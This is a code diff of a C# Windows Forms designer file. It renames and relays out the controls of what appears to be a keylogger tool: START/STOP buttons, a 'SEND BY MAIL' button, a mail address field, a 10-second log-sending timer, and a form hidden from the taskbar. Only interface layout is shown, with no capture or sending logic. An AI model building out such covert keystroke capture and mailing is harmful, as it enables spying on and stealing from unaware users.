@@ -30,28 +30,27 @@
         {
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
-            this.button1 = new System.Windows.Forms.Button();
+            this.buttonStart = new System.Windows.Forms.Button();
             this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
             this.key = new System.Windows.Forms.Timer(this.components);
             this.log = new System.Windows.Forms.Timer(this.components);
-            this.button2 = new System.Windows.Forms.Button();
-            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
-            this.button3 = new System.Windows.Forms.Button();
-            this.label1 = new System.Windows.Forms.Label();
-            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.buttonStop = new System.Windows.Forms.Button();
+            this.buttonSendLog = new System.Windows.Forms.Button();
+            this.timerSendLog = new System.Windows.Forms.Timer(this.components);
+            this.textBoxMail = new System.Windows.Forms.TextBox();
             this.SuspendLayout();
             // 
-            // button1
+            // buttonStart
             // 
-            this.button1.BackColor = System.Drawing.Color.Blue;
-            this.button1.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.button1.Location = new System.Drawing.Point(29, 25);
-            this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(98, 80);
-            this.button1.TabIndex = 0;
-            this.button1.Text = "START";
-            this.button1.UseVisualStyleBackColor = false;
-            this.button1.Click += new System.EventHandler(this.button1_Click);
+            this.buttonStart.BackColor = System.Drawing.Color.Lavender;
+            this.buttonStart.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.buttonStart.Location = new System.Drawing.Point(29, 25);
+            this.buttonStart.Name = "buttonStart";
+            this.buttonStart.Size = new System.Drawing.Size(79, 35);
+            this.buttonStart.TabIndex = 0;
+            this.buttonStart.Text = "START";
+            this.buttonStart.UseVisualStyleBackColor = false;
+            this.buttonStart.Click += new System.EventHandler(this.buttonStart_Click);
             // 
             // notifyIcon1
             // 
@@ -73,61 +72,52 @@
             this.log.Interval = 1;
             this.log.Tick += new System.EventHandler(this.log_Tick);
             // 
-            // button2
+            // buttonStop
             // 
-            this.button2.BackColor = System.Drawing.Color.Red;
-            this.button2.Location = new System.Drawing.Point(29, 140);
-            this.button2.Name = "button2";
-            this.button2.Size = new System.Drawing.Size(98, 60);
-            this.button2.TabIndex = 1;
-            this.button2.Text = "STOP";
-            this.button2.UseVisualStyleBackColor = false;
-            this.button2.Click += new System.EventHandler(this.button2_Click);
+            this.buttonStop.BackColor = System.Drawing.Color.Lavender;
+            this.buttonStop.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold);
+            this.buttonStop.Location = new System.Drawing.Point(29, 78);
+            this.buttonStop.Name = "buttonStop";
+            this.buttonStop.Size = new System.Drawing.Size(79, 36);
+            this.buttonStop.TabIndex = 1;
+            this.buttonStop.Text = "STOP";
+            this.buttonStop.UseVisualStyleBackColor = false;
+            this.buttonStop.Click += new System.EventHandler(this.buttonStop_Click);
             // 
-            // richTextBox1
+            // buttonSendLog
             // 
-            this.richTextBox1.Location = new System.Drawing.Point(339, 13);
-            this.richTextBox1.Name = "richTextBox1";
-            this.richTextBox1.Size = new System.Drawing.Size(445, 237);
-            this.richTextBox1.TabIndex = 2;
-            this.richTextBox1.Text = "";
+            this.buttonSendLog.BackColor = System.Drawing.Color.Lavender;
+            this.buttonSendLog.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold);
+            this.buttonSendLog.Location = new System.Drawing.Point(181, 72);
+            this.buttonSendLog.Name = "buttonSendLog";
+            this.buttonSendLog.Size = new System.Drawing.Size(79, 49);
+            this.buttonSendLog.TabIndex = 3;
+            this.buttonSendLog.Text = "SEND BY MAIL";
+            this.buttonSendLog.UseVisualStyleBackColor = false;
+            this.buttonSendLog.Click += new System.EventHandler(this.buttonSendLog_Click);
             // 
-            // button3
+            // timerSendLog
             // 
-            this.button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
-            this.button3.Location = new System.Drawing.Point(150, 25);
-            this.button3.Name = "button3";
-            this.button3.Size = new System.Drawing.Size(132, 64);
-            this.button3.TabIndex = 3;
-            this.button3.Text = "SEND BY MAIL";
-            this.button3.UseVisualStyleBackColor = false;
-            this.button3.Click += new System.EventHandler(this.button3_Click);
+            this.timerSendLog.Enabled = true;
+            this.timerSendLog.Interval = 10000;
+            this.timerSendLog.Tick += new System.EventHandler(this.timer1_Tick);
             // 
-            // label1
+            // textBoxMail
             // 
-            this.label1.AutoSize = true;
-            this.label1.Location = new System.Drawing.Point(45, 222);
-            this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(35, 13);
-            this.label1.TabIndex = 5;
-            this.label1.Text = "label1";
-            // 
-            // timer1
-            // 
-            this.timer1.Enabled = true;
-            this.timer1.Interval = 6000;
-            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            this.textBoxMail.Location = new System.Drawing.Point(124, 33);
+            this.textBoxMail.Name = "textBoxMail";
+            this.textBoxMail.Size = new System.Drawing.Size(186, 20);
+            this.textBoxMail.TabIndex = 4;
             // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(796, 262);
-            this.Controls.Add(this.label1);
-            this.Controls.Add(this.button3);
-            this.Controls.Add(this.richTextBox1);
-            this.Controls.Add(this.button2);
-            this.Controls.Add(this.button1);
+            this.ClientSize = new System.Drawing.Size(343, 132);
+            this.Controls.Add(this.textBoxMail);
+            this.Controls.Add(this.buttonSendLog);
+            this.Controls.Add(this.buttonStop);
+            this.Controls.Add(this.buttonStart);
             this.MaximumSize = new System.Drawing.Size(812, 300);
             this.Name = "Form1";
             this.ShowInTaskbar = false;
@@ -140,15 +130,14 @@
 
         #endregion
 
-        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button buttonStart;
         private System.Windows.Forms.NotifyIcon notifyIcon1;
         private System.Windows.Forms.Timer key;
         private System.Windows.Forms.Timer log;
-        private System.Windows.Forms.Button button2;
-        private System.Windows.Forms.RichTextBox richTextBox1;
-        private System.Windows.Forms.Button button3;
-        private System.Windows.Forms.Label label1;
-        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Button buttonStop;
+        private System.Windows.Forms.Button buttonSendLog;
+        private System.Windows.Forms.Timer timerSendLog;
+        private System.Windows.Forms.TextBox textBoxMail;
     }
 }
 
